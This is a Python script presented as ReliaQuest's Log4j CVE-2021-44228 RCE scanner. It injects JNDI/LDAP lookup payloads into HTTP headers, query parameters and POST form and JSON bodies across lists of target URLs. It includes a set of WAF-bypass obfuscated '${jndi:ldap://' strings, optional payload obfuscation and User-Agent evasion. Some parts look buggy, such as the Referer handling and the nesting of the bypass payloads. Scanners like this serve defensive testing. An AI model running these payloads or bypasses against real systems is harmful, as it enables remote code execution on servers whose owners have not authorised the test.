#!/usr/bin/env python3

import argparse
import requests
import sys
from urllib import parse as urlparse
import random
from termcolor import cprint
import jndiobfuscator

# Disable SSL warnings
try:
    import requests.packages.urllib3

    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

cprint('[+] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[+] Scanner provided by ReliaQuest', "yellow")

default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://",
                       "${${::-j}ndi:ldap://",
                       "${jndi:ldap://",
                       "${${lower:jndi}:${lower:ldap}://",
                       "${${lower:${lower:jndi}}:${lower:ldap}://",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}da${lower:p}}://",
                       "${jndi${::-:}ldap://"
                       ]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Scan a single URL.",
                    action='store')
parser.add_argument("--proxy",
                    dest="proxy",
                    help="Send requests through a HTTP proxy. Proxy should be specified in the format supported by "
                         "requests (http[s]://<proxy-ip>:<proxy-port>",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="File path to text file containing URLs to scan",
                    action='store')
parser.add_argument("-x", "--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--all-methods",
                    dest="all_methods",
                    help="Attempt both POST and GET requests",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--disable-http-redirects",
                    dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have "
                         "higher chance of reaching vulnerable systems.",
                    action='store_true')
parser.add_argument("-p", "--payload",
                    dest="exploit_payload",
                    help="The ReliaQuest provided testing string",
                    action="store",
                    required=True)
parser.add_argument("-o", "--obfuscate",
                    dest="obfuscate",
                    help="Use obfuscation on the payload (may result in application performance degradation)",
                    action='store_true')
parser.add_argument('-s', "--small-payloads",
                    dest="small_payloads",
                    help="Use smaller payloads. Generates more requests, but reduces size of requests (Recommended)",
                    action="store_true")

args = parser.parse_args()

proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(raw_payload):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = " ".join((i, raw_payload))
        payloads.append(new_payload)
    return payloads


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return ({"scheme": scheme,
             "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
             "host": urlparse.urlparse(url).netloc.split(":")[0],
             "file_path": file_path})


def do_exploit(payload, url, headers):
    if args.request_type.upper() == "GET" or args.all_methods:
        try:
            requests.request(url=url,
                             method="GET",
                             params={"v": payload},
                             headers=headers,
                             verify=False,
                             timeout=timeout,
                             allow_redirects=(not args.disable_redirects),
                             proxies=proxies)
        except Exception as e:
            print(f"EXCEPTION: {e}")

    if args.request_type.upper() == "POST" or args.all_methods:
        try:
            # Post body
            requests.request(url=url,
                             method="POST",
                             params={"v": payload},
                             headers=headers,
                             data=get_fuzzing_post_data(payload),
                             verify=False,
                             timeout=timeout,
                             allow_redirects=(not args.disable_redirects),
                             proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

        try:
            # JSON body
            requests.request(url=url,
                             method="POST",
                             params={"v": payload},
                             headers=headers,
                             json=get_fuzzing_post_data(payload),
                             verify=False,
                             timeout=timeout,
                             allow_redirects=(not args.disable_redirects),
                             proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")


def scan_url(url, payload):
    parsed_url = parse_url(url)
    payloads = [payload]
    if args.waf_bypass_payloads:
        raw_paylod = payload.split('://')[1]
        waf_paylaods = generate_waf_bypass_payloads(raw_paylod)
        payloads.append(waf_paylaods)
    for payload in payloads:
        if args.obfuscate:
            payload = jndiobfuscator.obfuscateStringRandom(payload, True)
        print(f"[+] URL: {url} | PAYLOAD: {payload}")
        if not args.small_payloads:
            do_exploit(payload, url, headers=get_fuzzing_headers(payload))
        else:
            fuzzing_headers = get_fuzzing_headers(payload)
            for header in fuzzing_headers:
                # Probably a better way to do this, but always set the user-agent header in any case
                destination_headers = {'User-Agent': fuzzing_headers['User-Agent']}
                if header.lower() != "user-agent":
                    destination_headers[header] = fuzzing_headers[header]
                do_exploit(payload, url, headers=destination_headers)


def main():
    if not args.url and not args.usedlist:
        raise argparse.ArgumentError(None, message="Either argument -u or -l/--list must be provided to scan a "
                                                   "target")
    if args.proxy:
        proxy = args.proxy
        if not proxy.startswith("http://"):
            if proxy.startswith("https://"):
                pass
            if not proxy.startswith("https://"):
                raise argparse.ArgumentError(None, message="Proxy URL had no scheme, should start with http:// or "
                                                           "https://")

    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    print("[%] Checking for Log4j RCE CVE-2021-44228.")
    for url in urls:
        print(f"[+] URL: {url}")
        scan_url(url, args.exploit_payload)

    print("[+] Payloads sent to all URLs. Please check if a ticket was created to verify whether attempts were "
          "successful")
    print("Exiting.")
    return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
